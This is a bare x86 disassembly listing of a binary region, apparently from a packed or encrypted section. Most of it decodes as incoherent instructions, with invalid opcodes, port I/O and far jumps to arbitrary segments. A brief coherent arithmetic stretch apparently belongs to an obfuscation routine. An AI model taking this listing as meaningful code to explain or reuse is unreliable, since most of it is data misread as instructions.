  412c87:	popf   
  412c88:	fisubr WORD PTR [eax-0x21]
  412c8b:	or     ebp,DWORD PTR [edi]
  412c8d:	xor    DWORD PTR [ebx-0x4e],ebx
  412c90:	sub    esp,DWORD PTR [bx+di]
  412c93:	mov    bl,0x94
  412c95:	jmp    0x412cc1
  412c97:	mov    esp,0x76f415f3
  412c9c:	mov    cl,0x85
  412c9e:	dec    ebp
  412c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca1:	or     BYTE PTR [ebx],0x2e
  412ca4:	in     al,dx
  412ca5:	jl     0x412d04
  412ca7:	xchg   BYTE PTR [eax],al
  412ca9:	imul   ebx,DWORD PTR [ebx+eiz*2-0x13896a6b],0xffffffd8
  412cb1:	xchg   esi,eax
  412cb2:	adc    eax,0x74b426ee
  412cb7:	xor    dl,cl
  412cb9:	sub    edi,DWORD PTR [ebp+0x71]
  412cbc:	cs pop esi
  412cbe:	(bad)  
  412cbf:	clc    
  412cc0:	lahf   
  412cc1:	add    eax,0xe3d33628
  412cc6:	out    dx,al
  412cc7:	sbb    edx,DWORD PTR ds:0x6acb88cd
  412ccd:	adc    eax,0x6a39595e
  412cd2:	push   0xb
  412cd4:	mov    cl,0xfd
  412cd6:	gs mov edi,0x730b61d0
  412cdc:	inc    ebp
  412cdd:	jb     0x412d33
  412cdf:	in     eax,0x1e
  412ce1:	xchg   ecx,eax
  412ce2:	(bad)  
  412ce3:	(bad)  
  412ce4:	test   DWORD PTR [ebx],ebp
  412ce6:	pop    ss
  412ce7:	test   al,0x97
  412ce9:	xor    BYTE PTR [edi],al
  412ceb:	push   0x5c
  412ced:	mov    cl,0xa5
  412cef:	je     0x412d2d
  412cf1:	aad    0x13
  412cf3:	inc    edx
  412cf4:	push   eax
  412cf5:	mov    ch,0xc8
  412cf7:	in     eax,0x4
  412cf9:	lahf   
  412cfa:	popa   
  412cfb:	mov    bh,0x25
  412cfd:	mov    WORD PTR [edx-0xa4fe906],ds
  412d03:	and    DWORD PTR [ebx+0x2d],eax
  412d06:	ds popf 
  412d08:	aad    0x38
  412d0a:	pop    edx
  412d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0c:	mov    WORD PTR [esi+edi*2],gs
  412d0f:	mov    esi,0xa13e5b3d
  412d14:	dec    esi
  412d15:	push   edx
  412d16:	out    0x3,al
  412d18:	stos   BYTE PTR es:[edi],al
  412d19:	call   0x5b02:0x301ec09d
  412d20:	mov    esp,0xc078312f
  412d25:	mov    ds:0xb61f80d4,eax
  412d2a:	aas    
  412d2b:	movups XMMWORD PTR [ebx],xmm5
  412d2e:	int3   
  412d2f:	daa    
  412d30:	movq   QWORD PTR [ecx+0x7d5ceca9],mm4
  412d37:	cmp    BYTE PTR [esi-0x19],0xd
  412d3b:	pop    ebx
  412d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d3d:	test   al,0x38
  412d3f:	inc    ecx
  412d40:	imul   DWORD PTR [edx]
  412d42:	mov    eax,0x73a8e744
  412d47:	loope  0x412cdf
  412d49:	jge    0x412ccc
  412d4b:	jl     0x412d70
  412d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d4e:	jo     0x412d8a
  412d50:	gs sub eax,0x3a442abd
  412d56:	data16 jmp 0x412d96
  412d59:	ja     0x412d88
  412d5b:	pusha  
  412d5c:	shr    DWORD PTR [esi-0x3f222bc5],1
  412d62:	mov    bl,0x7c
  412d64:	jns    0x412de5
  412d66:	(bad)  
  412d68:	call   0xc7f9:0x3da55755
  412d6f:	pusha  
  412d70:	mov    ds,eax
  412d72:	sar    DWORD PTR [eax+0x6a],0xae
  412d76:	jo     0x412de9
  412d78:	push   edi
  412d79:	jb     0x412d72
  412d7b:	pusha  
  412d7c:	push   edi
  412d7d:	or     al,0x7
  412d7f:	adc    eax,DWORD PTR [ebp+edi*4-0x497d5251]
  412d86:	cwde   
  412d87:	xor    edi,0x7d
  412d8a:	mov    edi,DWORD PTR [ebx-0x42]
  412d8d:	adc    al,0x21
  412d8f:	in     al,0x67
  412d91:	mov    al,ds:0x4e4b367a
  412d96:	mov    ah,0xc6
  412d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d99:	test   DWORD PTR [edi-0x2b01a4a8],ecx
  412d9f:	daa    
  412da0:	out    0xc1,eax
  412da2:	push   ecx
  412da3:	push   es
  412da4:	mov    bh,0xc9
  412da6:	xchg   edi,eax
  412da7:	aam    0x75
  412da9:	test   al,0xa0
  412dab:	inc    edi
  412dac:	ret    0xae34
  412daf:	idiv   BYTE PTR [ecx-0x1665c542]
  412db5:	mov    esp,0x25be0105
  412dba:	and    ecx,edi
  412dbc:	shl    BYTE PTR ds:[eax],cl
  412dbf:	ins    DWORD PTR es:[edi],dx
  412dc0:	or     al,0xb0
  412dc2:	nop
  412dc3:	(bad)  
  412dc4:	fidivr WORD PTR [eax]
  412dc6:	dec    eax
  412dc7:	xchg   ebx,eax
  412dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dc9:	xchg   ecx,eax
  412dca:	mov    ebx,edx
  412dcc:	and    edi,DWORD PTR [eax-0xd07fb57]
  412dd2:	je     0x412dcb
  412dd4:	aas    
  412dd5:	xor    eax,0xff55384c
  412dda:	mov    ebx,0x226d215e
  412de0:	fdivr  st(1),st
  412de2:	adc    DWORD PTR [ebx-0x27598ec1],edx
  412de8:	sahf   
  412de9:	lds    ebx,FWORD PTR [eax+0x90677c3]
  412def:	push   0xfffffffb
  412df1:	(bad)  
  412df2:	faddp  st(1),st
  412df4:	pop    ebx
  412df5:	mov    dh,0xf8
  412df7:	mov    eax,ds:0x436945f5
  412dfc:	xchg   ebx,eax
  412dfd:	je     0x412e0e
  412dff:	int    0x14
  412e01:	repz dec dx
  412e04:	adc    BYTE PTR [ecx+esi*4],dl
  412e07:	and    BYTE PTR [ebx+0x658549ca],ch
  412e0d:	xchg   esp,eax
  412e0e:	push   ss
  412e0f:	in     al,dx
  412e10:	repz and eax,0x2c880935
  412e16:	sub    bl,BYTE PTR [ebx]
  412e18:	cmp    eax,0x30e07999
  412e1d:	cmc    
  412e1e:	sbb    DWORD PTR [edi-0x2df6d884],0x6c
  412e25:	push   ds
  412e26:	mov    al,BYTE PTR [esi-0x1d97ac6]
  412e2c:	jg     0x412e92
  412e2e:	fbstp  TBYTE PTR [ebx-0xd]
  412e31:	fdivr  DWORD PTR ds:0x9f50f8d1
  412e37:	ss mov ch,ch
  412e3a:	divps  xmm2,xmm4
  412e3d:	and    DWORD PTR [esi+0x6e],0x3abb0f4f
  412e44:	xor    DWORD PTR [edi+0x4f4a8387],ebp
  412e4a:	adc    bl,dh
  412e4c:	mov    dl,0xba
  412e4e:	cmp    DWORD PTR [eax+ebp*4],ebp
  412e51:	or     DWORD PTR [ebp+ebx*4-0x237a2ee4],esp
  412e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e59:	push   0xb706e590
  412e5e:	or     BYTE PTR [ecx-0x11fb307e],al
  412e64:	out    0xa2,eax
  412e66:	xchg   esp,eax
  412e67:	test   DWORD PTR [ebx],esi
  412e69:	inc    esp
  412e6a:	sub    BYTE PTR [esi],0x7f
  412e6d:	inc    edx
  412e6e:	mov    ebp,0x43ea2cbf
  412e73:	das    
  412e74:	push   0xa4c0eb8a
  412e79:	cmp    ah,BYTE PTR [ebx]
  412e7b:	mov    es,WORD PTR [ebx-0x3e]
  412e7e:	pop    esi
  412e7f:	repz pop ebp
  412e81:	rcr    BYTE PTR [eax-0x1e],1
  412e84:	(bad)  
  412e86:	sbb    al,0x7b
  412e88:	xchg   edx,eax
  412e89:	stos   BYTE PTR es:[edi],al
  412e8a:	push   ss
  412e8b:	ins    BYTE PTR es:[edi],dx
  412e8c:	xchg   ebp,eax
  412e8d:	or     al,0x8e
  412e8f:	jmp    0x9cdf:0x89805e1c
  412e96:	inc    eax
  412e97:	jno    0x412e2a
  412e99:	add    al,0x42
  412e9b:	dec    esi
  412e9c:	add    eax,0xfb2a03a1
  412ea1:	mov    ch,0x90
  412ea3:	pushf  
  412ea4:	sub    eax,0xa785edd2
  412ea9:	bound  eax,QWORD PTR [edx+0x11]
  412eac:	dec    edi
  412ead:	sahf   
  412eae:	(bad)  
  412eaf:	loope  0x412eb5
  412eb1:	jp     0x412ea4
  412eb3:	push   esi
  412eb4:	adc    eax,0x160e80e0
  412eb9:	xlat   BYTE PTR ds:[ebx]
  412eba:	cld    
  412ebb:	sub    ebx,ebp
  412ebd:	leave  
  412ebe:	mov    bp,WORD PTR [esi+0x2]
  412ec2:	ins    DWORD PTR es:[edi],dx
  412ec3:	add    esi,DWORD PTR ds:0xb4f820c5
  412ec9:	mov    cs,WORD PTR [esi]
  412ecb:	jnp    0x412eba
  412ecd:	(bad)  
  412ece:	mov    ecx,0xe4badfa1
  412ed3:	fisub  DWORD PTR [ecx+esi*1-0x54]
  412ed7:	mov    eax,ds:0xb402ddbe
  412edc:	ret    
  412edd:	push   cs
  412ede:	sbb    edi,DWORD PTR [ebx]
  412ee0:	sub    BYTE PTR [eax-0x77],ch
  412ee3:	cmp    eax,0x2c57658
  412ee8:	xchg   ebx,eax
  412ee9:	fnstenv [edi+0x446bae2c]
  412eef:	mov    dl,bh
  412ef1:	out    dx,eax
  412ef2:	daa    
  412ef3:	adc    bl,BYTE PTR es:[eax+0x45994ba4]
  412efa:	sub    al,0x5c
  412efc:	sbb    eax,0xdd42ef7e
  412f01:	scas   al,BYTE PTR es:[edi]
  412f02:	push   ebp
  412f03:	pop    edi
  412f04:	icebp  
  412f05:	mov    al,0x93
  412f07:	dec    ebx
  412f08:	shl    esi,1
  412f0a:	inc    esp
  412f0b:	rcr    BYTE PTR [eax],1
  412f0d:	fidiv  DWORD PTR [edx-0x1a]
  412f10:	test   BYTE PTR [esi+0xc8182f],0x2b
  412f17:	mov    edx,0x14890be6
  412f1c:	and    bl,BYTE PTR [esi+0x38e7109b]
  412f22:	mov    cl,0xa
  412f24:	lea    ecx,[ebp+esi*1-0x7e36c62d]
  412f2b:	lds    esp,FWORD PTR [ecx+eiz*1+0xb]
  412f2f:	xchg   BYTE PTR ss:[eax-0x2b],dl
  412f33:	push   cs
  412f34:	sbb    eax,0x3267e29e
  412f39:	or     ah,BYTE PTR [edi-0x5f]
  412f3c:	jbe    0x412f32
  412f3e:	mov    ds:0x9c4115db,al
  412f43:	or     al,0x20
  412f45:	loope  0x412f00
  412f47:	dec    ecx
  412f48:	jns    0x412f3f
  412f4a:	jne    0x412f67
  412f4c:	xchg   edi,eax
  412f4d:	jnp    0x412f1b
  412f4f:	sub    DWORD PTR [ecx+0x4],eax
  412f52:	mov    ebx,0xdbd13050
  412f57:	push   esi
  412f58:	jo     0x412f95
  412f5a:	add    al,0x59
  412f5c:	jl     0x412f7e
  412f5e:	push   eax
  412f5f:	jp     0x412f7b
  412f61:	mov    DWORD PTR ss:[eax-0x7],0x83cc5970
  412f69:	mov    ds:0x537cbe68,eax
  412f6e:	loopne 0x412f5a
  412f70:	ins    DWORD PTR es:[edi],dx
  412f71:	cmp    DWORD PTR [ecx],esi
  412f73:	pop    esp
  412f74:	xor    eax,DWORD PTR [edx]
  412f76:	mov    eax,ds:0x24ab27c8
  412f7b:	or     BYTE PTR [ecx+0x6891308e],0xba
  412f82:	jo     0x412fd4
  412f84:	lods   eax,DWORD PTR ds:[esi]
  412f85:	jno    0x412f6e
  412f87:	int    0x77
  412f89:	mov    ebx,0x7852becb
  412f8e:	dec    ecx
  412f8f:	mov    dl,0x4c
  412f91:	dec    ecx
  412f92:	or     eax,DWORD PTR [eax+0x633535f1]
  412f98:	inc    eax
  412f99:	mov    DWORD PTR [edi-0x1b],esp
  412f9c:	xor    DWORD PTR [edx],ebx
  412f9e:	nop
  412f9f:	fnstsw WORD PTR [ecx+eiz*4-0x32e40c70]
  412fa6:	add    BYTE PTR [esi],ah
  412fa8:	repz mov WORD PTR [esi],es
  412fab:	jge    0x412f9a
  412fad:	popa   
  412fae:	hlt    
  412faf:	mov    ebx,edx
  412fb1:	and    DWORD PTR [edx+0x69484254],edx
  412fb7:	sub    dh,BYTE PTR [esi+0x71]
  412fba:	mov    eax,0xb9fede0f
  412fbf:	aas    
  412fc0:	xchg   edx,eax
  412fc1:	rol    ebx,1
  412fc3:	ficom  DWORD PTR [esi]
  412fc5:	fninit 
  412fc7:	jae    0x412f7e
  412fc9:	pop    ebp
  412fca:	addr16 xor ebx,edx
  412fcd:	mov    edi,0xb7e65825
  412fd2:	call   0x1089:0x7fcce933
  412fd9:	pop    ebx
  412fda:	fiadd  WORD PTR [ebx+0xe]
  412fdd:	sar    DWORD PTR [edx],1
  412fdf:	xchg   DWORD PTR [edx],ebp
  412fe1:	push   ds
  412fe2:	xchg   edx,eax
  412fe3:	fadd   QWORD PTR [ebx]
  412fe5:	push   eax
  412fe6:	xor    ecx,DWORD PTR [eax+0x79]
  412fe9:	stos   DWORD PTR es:[edi],eax
  412fea:	sub    al,0x6d
  412fec:	ror    edx,0x97
  412fef:	data16 aad 0xce
  412ff2:	scas   eax,DWORD PTR es:[edi]
  412ff3:	pusha  
  412ff4:	rcl    DWORD PTR [esp+eax*4-0x4b19bd86],0xc0
  412ffc:	mov    eax,ds:0x307ead58
  413001:	push   esp
  413002:	sbb    esp,DWORD PTR [esi+0x43f58fc]
  413008:	idiv   DWORD PTR [edx]
  41300a:	push   ebp
  41300b:	out    0xec,al
  41300d:	enter  0x539b,0x5c
  413011:	and    ebx,DWORD PTR [ebx]
  413013:	push   0xffffffad
  413015:	stos   BYTE PTR es:[edi],al
  413016:	sti    
  413017:	dec    ebx
  413018:	pop    ss
  413019:	lds    edx,FWORD PTR ds:0xbefc7510
  41301f:	sub    eax,0x4ef8e8c2
  413025:	add    ecx,esi
  413027:	shl    DWORD PTR [ecx+eiz*1],0xa7
  41302b:	cmp    eax,0xc21894de
  413030:	push   es
  413031:	sub    BYTE PTR [esi-0x3a6bf8f1],0x7f
  413038:	inc    ebp
  413039:	inc    eax
  41303a:	repnz mov al,ds:0x9eb8b996
  413040:	jno    0x413092
  413042:	rcl    DWORD PTR [esi],cl
  413044:	xor    edi,DWORD PTR [eax]
  413046:	sbb    DWORD PTR ds:0x51fad80d,esp
  41304c:	ds iret 
  41304e:	jmp    0x412ff1
  413050:	mov    ebp,0xf12571cd
  413055:	cs mov dl,cl
  413058:	xchg   esi,eax
  413059:	call   0xc670:0xb5664ee7
  413060:	or     eax,0x37e4efb7
  413065:	mov    BYTE PTR [edi],ah
  413067:	js     0x413073
  413069:	push   0x52
  41306b:	loop   0x413088
  41306d:	mov    eax,ds:0x4e921f10
  413072:	neg    ah
  413074:	inc    eax
  413075:	repnz mov cl,0x55
  413078:	out    dx,eax
  413079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307a:	xor    eax,edi
  41307c:	shl    ecx,0x1e
  41307f:	xor    edx,edx
  413081:	or     eax,edx
  413083:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413087:	mov    eax,DWORD PTR [ebp+0x14]
  41308a:	or     BYTE PTR [eax],cl
  41308c:	mov    eax,DWORD PTR [ebp-0x48]
  41308f:	mov    ecx,DWORD PTR [ebp-0x44]
  413092:	shrd   eax,ecx,0x2
  413096:	shr    ecx,0x2
  413099:	mov    ecx,DWORD PTR [ebp-0x48]
  41309c:	mov    edx,DWORD PTR [ebp-0x44]
  41309f:	xor    eax,edi
  4130a1:	xor    edx,edx
  4130a3:	or     eax,edx
  4130a5:	add    eax,DWORD PTR ds:0x422298
  4130ab:	shl    ecx,0x1e
  4130ae:	mov    DWORD PTR [ebp+0x14],eax
  4130b1:	jmp    0x41363b
  4130b6:	xchg   ebx,eax
  4130b7:	fadd   DWORD PTR [eax]
  4130b9:	mov    eax,ds:0xd89398c0
  4130be:	out    0x8d,al
  4130c0:	shr    BYTE PTR [eax+0x7268e81d],cl
  4130c6:	mov    dh,0x10
  4130c8:	or     al,0x16
  4130ca:	cmp    eax,0x1b161604
  4130cf:	nop
  4130d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d1:	out    0x9f,al
  4130d3:	inc    edx
  4130d4:	mov    ecx,0xaf481f1c
  4130d9:	or     eax,0xf6a62d5
  4130de:	out    0x7,eax
  4130e0:	jmp    0x413128
  4130e2:	pop    ebp
  4130e3:	push   edi
  4130e4:	loope  0x413139
  4130e6:	push   ebx
  4130e7:	pop    ds
  4130e8:	fmul   QWORD PTR [ebx-0x33]
  4130eb:	pop    eax
  4130ec:	jge    0x4130c2
  4130ee:	rcl    BYTE PTR [eax],cl
  4130f0:	mov    al,0xdb
  4130f2:	lds    eax,FWORD PTR [ecx-0x7a]
  4130f5:	cs xchg esp,eax
  4130f7:	adc    al,ah
  4130f9:	test   DWORD PTR [esi],esp
  4130fb:	mov    esi,0x45ed8a90
  413100:	mov    dh,0xdb
  413102:	push   esi
  413103:	repnz repnz adc edi,edi
  413107:	clc    
  413108:	pop    esp
  413109:	jnp    0x4130b8
  41310b:	push   esi
  41310c:	push   esp
  41310d:	in     al,0x64
  41310f:	lds    edi,FWORD PTR [esi-0x25]
  413112:	or     DWORD PTR [esi],ebx
  413114:	out    0xa3,eax
  413116:	mov    ds:0xddc58e46,eax
  41311b:	hlt    
  41311c:	mov    ebx,0xff8c5e09
  413121:	fdiv   QWORD PTR ds:[eax+eiz*2]
  413125:	jo     0x41317e
  413127:	xor    esp,edx
  413129:	pop    ss
  41312a:	sub    al,0x2f
  41312c:	(bad)  
  41312d:	sbb    eax,0xefb38aff
  413132:	dec    esi
  413133:	add    bh,BYTE PTR [edx-0x30a9ba84]
  413139:	push   0x9af74a45
  41313e:	call   0xfdb1:0xf4a666a4
  413145:	outs   dx,DWORD PTR ds:[esi]
  413146:	in     al,dx
  413147:	dec    esp
  413148:	sub    DWORD PTR [ecx],edx
  41314a:	lsl    ecx,WORD PTR [ebp+0x21f3ec89]
  413151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413152:	lods   eax,DWORD PTR ds:[esi]
  413153:	icebp  
  413154:	jne    0x4131a9
  413156:	lock rcl cl,cl
  413159:	in     al,0x1e
  41315b:	pop    ebx
  41315c:	(bad)  
  41315d:	retf   
  41315e:	pushf  
  41315f:	adc    eax,0x8da83fed
  413164:	std    
  413165:	aad    0xc8
  413167:	xor    DWORD PTR [edi+edx*2],ebx
  41316a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41316b:	pop    ecx
  41316c:	sub    bh,BYTE PTR [eax+0x6d]
  41316f:	outs   dx,DWORD PTR ds:[esi]
  413170:	scas   eax,DWORD PTR es:[edi]
  413171:	dec    edx
  413172:	mov    dl,0xbc
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	mov    eax,ds:0xf5ea5412
  41317a:	or     BYTE PTR [esp+edi*2-0x413012e4],ch
  413181:	retf   0x5c38
  413184:	cmp    eax,0xe552c975
  413189:	adc    al,0xa3
  41318b:	sbb    eax,0xa9dc4df3
  413190:	out    dx,al
  413191:	lds    eax,FWORD PTR [edi+ecx*4+0x6e]
  413195:	cmp    al,0x98
  413197:	jo     0x413172
  413199:	dec    eax
  41319a:	mov    ds:0x71c2d79,al
  41319f:	jns    0x413180
  4131a1:	leave  
  4131a2:	out    dx,eax
  4131a3:	jge    0x41315a
  4131a5:	xlat   BYTE PTR ds:[ebx]
  4131a6:	or     cl,dl
  4131a8:	repz out 0x38,al
  4131ab:	mov    dh,0x24
  4131ad:	scas   eax,DWORD PTR es:[edi]
  4131ae:	ror    DWORD PTR [esp-0x6e00f7ff],1
  4131b5:	dec    ebx
  4131b6:	sar    DWORD PTR [esp+esi*1-0x61],0x63
  4131bb:	cmp    DWORD PTR [ebp+0x6a0c6c5e],eax
  4131c1:	(bad)  
  4131c2:	icebp  
  4131c3:	imul   edi,DWORD PTR [ecx+0x638c1ca9],0x979825df
  4131cd:	mov    edx,DWORD PTR [eax-0x73]
  4131d0:	out    0xda,al
  4131d2:	dec    edx
  4131d3:	bound  ecx,QWORD PTR [esi+ecx*8+0xd]
  4131d7:	sahf   
  4131d8:	or     eax,0xab4b8687
  4131dd:	js     0x41322c
  4131df:	or     al,0xda
  4131e1:	fadd   DWORD PTR [ecx+0x1a342bc8]
  4131e7:	mov    dl,bl
  4131e9:	das    
  4131ea:	pop    eax
  4131eb:	in     al,dx
  4131ec:	ins    DWORD PTR es:[edi],dx
  4131ed:	dec    esp
  4131ee:	stc    
  4131ef:	mov    cs,WORD PTR [ecx+0x7e9571c8]
  4131f5:	xchg   DWORD PTR [eax+0x7b],edx
  4131f8:	xchg   esi,eax
  4131f9:	fidivr DWORD PTR [esi+edx*4-0x314430f8]
  413200:	out    0xc9,al
  413202:	push   edx
  413203:	ret    0x2965
  413206:	popa   
  413207:	ds out 0x8,eax
  41320a:	(bad)  
  41320c:	lods   al,BYTE PTR cs:[esi]
  41320e:	mov    ah,0x29
  413210:	sub    edi,DWORD PTR [edi-0x70b67b0e]
  413216:	ret    0xa6c3
  413219:	xchg   ebp,eax
  41321a:	ins    BYTE PTR es:[edi],dx
  41321b:	jbe    0x413229
  41321d:	adc    DWORD PTR [eax],eax
  41321f:	sbb    BYTE PTR [eax+0x31],ch
  413222:	jg     0x4131db
  413224:	inc    ecx
  413225:	loope  0x4131e9
  413227:	bound  esp,QWORD PTR [ebp+0x49612e75]
  41322d:	push   ds
  41322e:	pop    esi
  41322f:	adc    ebp,ebp
  413231:	pushf  
  413232:	loopne 0x41320e
  413234:	pop    esi
  413235:	repnz fs xchg esp,eax
  413238:	push   0xffffffc8
  41323a:	or     BYTE PTR [edx],0x8
  41323d:	mov    ch,0xeb
  41323f:	ss mov ebp,0x8143f0f0
  413245:	fld    TBYTE PTR [ebx-0x5f]
  413248:	imul   eax,DWORD PTR [edi+0x1115a8e6],0x3473c778
  413252:	adc    al,0xa3
  413254:	or     al,0xc1
  413256:	clc    
  413257:	mov    ebp,0x352f096a
  41325c:	jmp    0xc03:0x42510b2f
  413263:	jle    0x4132d0
  413265:	xchg   ecx,eax
  413266:	ds jns 0x4132d8
  413269:	out    0x9a,eax
  41326b:	inc    esp
  41326c:	pushf  
  41326d:	jns    0x41320c
  41326f:	stc    
  413270:	or     DWORD PTR [ebp-0x7589c393],esi
  413276:	lock in al,dx
  413278:	dec    edx
  413279:	jbe    0x41321c
  41327b:	adc    ecx,DWORD PTR [edx]
  41327d:	sbb    eax,0x849c30d4
  413282:	sbb    eax,0x11d936ed
  413287:	dec    esi
  413288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413289:	les    esp,FWORD PTR [ebx+esi*2]
  41328c:	lock jle 0x41321f
  41328f:	jns    0x41326e
  413291:	inc    edi
  413292:	nop
  413293:	inc    esi
  413294:	rcl    DWORD PTR [ecx],1
  413296:	pop    eax
  413297:	jmp    0x64e396ee
  41329c:	dec    esp
  41329d:	out    dx,al
  41329e:	jo     0x4132b8
  4132a0:	sar    dl,0x20
  4132a3:	xor    al,BYTE PTR [ebx]
  4132a5:	cmp    al,0x6c
  4132a7:	add    al,0xe7
  4132a9:	hlt    
  4132aa:	mov    edx,0x158b947c
  4132af:	pop    ds
  4132b0:	mov    ebp,DWORD PTR gs:[eax]
  4132b3:	sub    eax,0xb25a459
  4132b8:	jle    0x413317
  4132ba:	test   al,0x25
  4132bc:	inc    esi
  4132bd:	inc    edx
  4132be:	hlt    
  4132bf:	lds    edi,FWORD PTR [eax]
  4132c1:	adc    ebx,edx
  4132c3:	inc    ebx
  4132c4:	scas   eax,DWORD PTR es:[edi]
  4132c5:	je     0x413275
  4132c7:	mov    ds:0xa8ee55b1,eax
  4132cc:	rcr    ecx,0xdd
  4132cf:	xor    DWORD PTR [esi],0x74
  4132d2:	mov    edi,0xaca6c847
  4132d7:	push   0xe5a911ff
  4132dc:	(bad)  [ebx-0x22]
  4132df:	mov    edi,0x7adf081f
  4132e4:	and    al,0xf7
  4132e6:	scas   eax,DWORD PTR es:[edi]
  4132e7:	pop    edi
  4132e8:	and    eax,0xa225658d
  4132ed:	aas    
  4132ee:	or     eax,0xf91a5451
  4132f3:	js     0x41329f
  4132f5:	add    ch,BYTE PTR [edi]
  4132f7:	loope  0x41336c
  4132f9:	ja     0x4132c0
  4132fb:	jle    0x413289
  4132fd:	dec    ebp
  4132fe:	loopne 0x41332d
  413300:	mov    DWORD PTR gs:[ecx],ecx
  413303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413304:	mov    ebp,0x5c3ee8ff
  413309:	rcr    BYTE PTR ds:0x64be3e71,0x5e
  413310:	push   ecx
  413311:	fadd   st(3),st
  413313:	push   esi
  413314:	push   cs
  413315:	xchg   esi,eax
  413316:	jo     0x413345
  413318:	mov    eax,ds:0x2e4773c8
  41331d:	shl    DWORD PTR ds:0x5ca0cc21,cl
  413323:	call   FWORD PTR [edi-0x1d653ea]
  413329:	mov    esi,0x6b3888ed
  41332e:	repz pop ss
  413330:	mov    DWORD PTR [edx],eax
  413332:	adc    eax,0xffffffff
  413335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413336:	mov    eax,0x61fd03b5
  41333b:	mov    bl,bh
  41333d:	shl    BYTE PTR [eax+0x67],1
  413340:	in     al,dx
  413341:	push   0x6c
  413343:	loop   0x413313
  413345:	mov    bl,0x2
  413347:	jmp    0x41339d
  413349:	sub    BYTE PTR [eax+edx*2+0x3044d066],dh
  413350:	(bad)
  413355:	int    0x15
  413357:	retf   
  413358:	and    DWORD PTR [ebx-0x50],edi
  41335b:	xchg   edx,eax
  41335c:	dec    ecx
  41335d:	pushf  
  41335e:	xlat   BYTE PTR gs:[ebx]
  413360:	stos   DWORD PTR es:[edi],eax
  413361:	ds mov eax,0x81b160a3
  413367:	pop    DWORD PTR [ebp-0x47]
  41336a:	in     eax,0x31
  41336c:	retf   
  41336d:	mov    edi,0xe5083c39
  413372:	dec    esp
  413373:	sub    DWORD PTR [eax],ecx
  413375:	or     DWORD PTR [ecx-0x43c997e0],esp
  41337b:	sti    
  41337c:	dec    ebp
  41337d:	pop    ss
  41337e:	sub    eax,0xf8a69ffd
  413383:	push   eax
  413384:	dec    esi
  413385:	push   cs
  413386:	and    ebp,DWORD PTR [ecx]
  413388:	js     0x413327
  41338a:	aam    0x77
  41338c:	or     bl,BYTE PTR [edx-0x6206f28]
  413392:	adc    eax,esp
  413394:	test   dl,0xfc
  413397:	fsub   QWORD PTR [esi+0x529b118a]
  41339d:	xor    BYTE PTR [esi-0x6f75f7ee],ch
  4133a3:	loope  0x413332
  4133a5:	cmp    DWORD PTR [ebp+0x7833a12c],ebp
  4133ab:	pop    esp
  4133ac:	cmp    bl,bl
  4133ae:	dec    ebp
  4133af:	out    0xa4,eax
  4133b1:	mov    al,ds:0xffbc4632
  4133b6:	or     BYTE PTR [ebx+0x19],dl
  4133b9:	out    0xd,eax
  4133bb:	jg     0x4133d3
  4133bd:	and    eax,DWORD PTR [esi-0x21107161]
  4133c3:	or     eax,0xfe871c4e
  4133c8:	je     0x413443
  4133ca:	lods   al,BYTE PTR ds:[esi]
  4133cb:	push   edi
  4133cc:	not    BYTE PTR [esi]
  4133ce:	dec    eax
  4133cf:	data16 in al,dx
  4133d1:	pop    ebp
  4133d2:	bound  edi,QWORD PTR [eax-0x73]
  4133d5:	or     BYTE PTR [edx],0x2d
  4133d8:	sbb    BYTE PTR [ebx],bl
  4133da:	out    0x8a,eax
  4133dc:	and    DWORD PTR [ecx+0x7b],0x9527ac95
  4133e3:	jo     0x41338c
  4133e5:	jne    0x4133e3
  4133e7:	pop    ebp
  4133e8:	sbb    ebp,edi
  4133ea:	(bad)  
  4133ec:	and    eax,0x8571c065
  4133f1:	stos   BYTE PTR es:[edi],al
  4133f2:	cmc    
  4133f3:	ficom  WORD PTR [ecx-0x41]
  4133f6:	push   esp
  4133f7:	lea    ebp,[edi+0x435db54a]
  4133fd:	cld    
  4133fe:	pxor   mm1,QWORD PTR [eax-0x1f]
  413402:	data16 fld DWORD PTR [ecx+0x5e3d088d]
  413409:	mov    dh,0x64
  41340b:	mov    ah,0x1e
  41340d:	add    ebx,DWORD PTR [edi]
  41340f:	inc    esp
  413410:	xor    esp,esp
  413412:	pop    ebp
  413413:	(bad)  
  413414:	dec    edx
  413415:	jb     0x4133b4
  413417:	fisttp QWORD PTR [ebx+ebx*2]
  41341a:	out    dx,al
  41341b:	push   eax
  41341c:	rcr    DWORD PTR [ebp-0x76],cl
  41341f:	jbe    0x4133c1
  413421:	(bad)  
  413422:	lahf   
  413423:	push   ds
  413424:	int    0x3c
  413426:	stos   BYTE PTR es:[edi],al
  413427:	xchg   BYTE PTR [edi-0xf],dh
  41342a:	not    esp
  41342c:	adc    DWORD PTR [eax+ecx*2-0x61],0xc33456a
  413434:	jl     0x413459
  413436:	out    dx,al
  413437:	xor    BYTE PTR [esi],dl
  413439:	push   ds
  41343a:	xor    BYTE PTR [ecx],0xe3
  41343d:	mov    dl,0x97
  41343f:	jg     0x413464
  413441:	and    BYTE PTR ds:0xd7001f86,0x66
  413448:	jbe    0x4133e1
  41344a:	dec    esp
  41344b:	cmp    al,0xfe
  41344d:	jae    0x413484
  41344f:	xchg   edx,eax
  413450:	sti    
  413451:	jo     0x413426
  413453:	sbb    ah,BYTE PTR ds:[eax-0x4c]
  413457:	test   al,0x35
  413459:	call   0x6d129255
  41345e:	cmc    
  41345f:	in     eax,0x16
  413461:	inc    esp
  413462:	jns    0x4134b4
  413464:	jecxz  0x413480
  413466:	dec    ecx
  413467:	fs push 0xde03d9a2
  41346d:	push   ds
